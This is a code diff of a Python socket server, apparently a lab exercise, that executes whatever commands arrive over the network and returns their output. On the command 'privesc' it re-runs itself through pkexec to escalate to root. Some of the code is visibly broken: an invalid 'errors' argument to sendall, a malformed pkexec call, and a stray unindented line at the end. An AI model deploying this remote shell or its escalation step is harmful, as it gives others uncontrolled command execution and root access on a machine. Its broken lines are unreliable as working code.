@@ -107,62 +107,21 @@ def handle_conn(conn, addr):
                     response = f"Command executed. Exist code: {result.returncode}"
                 conn.sendall(response.encode("utf-8"), errors = "replace")
 
+                if command == "privesc":
+                    subprocess.run(["pkexec"], THIS_FILE)
+
             except Exception as e:
                 conn.sendall(f"error: {str(e)}\n".encode("utf-8"))
                 break
 
 
 
-        
-
         # Think VERY carefully about how you will communicate between the client and server
         # You will need to make a custom protocol to transfer commands
             
             # Process the communication data from 
             
-            
-
-
-
-def handle_conn(conn, addr):
-    with conn:
-        print(f"connected by {addr}")
-        # If you need to receive more data, you may need to loop
-        # Note that there is actually no way to know we have gotten "all" of the data
-        # We only know if the connection was closed, but if the client is waiting for us to say something,
-        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
-        # For example, you could send a length value before any command, decide on null byte as ending,
-        # base64 encode every command, etc
-        data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
-
-        if not data:
-            return
-
-        # 1. Clean the received data into a string command
-        command = data.decode("utf-8", errors="replace").strip()
-
-        # 2. Check for unique privilege escalation string
-        if command == "privesc":
-            print("Escalating to root...")
-            # Re-runs this script using pkexec (which prompts for password)
-            subprocess.Popen(["pkexec", sys.executable, THIS_FILE])
-            sys.exit(0) # Exit the current non-root process
-
-        # 3. Handle the "whoami" command specifically
-        if command == "whoami":
-            result = run_command("whoami")
-            conn.sendall(result.stdout.encode())
-            return
-
-        # 4. Fallback: Run any other command received
-        try:
-            result = run_command(command)
-            response = result.stdout + result.stderr
-            conn.sendall(response.encode() if response else b"Done (no output)")
-        except Exception as e:
-            conn.sendall(f"error: {e}".encode())
-
+        
         
 command = data.decode("utf-8", errors = "replace").strip() 
         
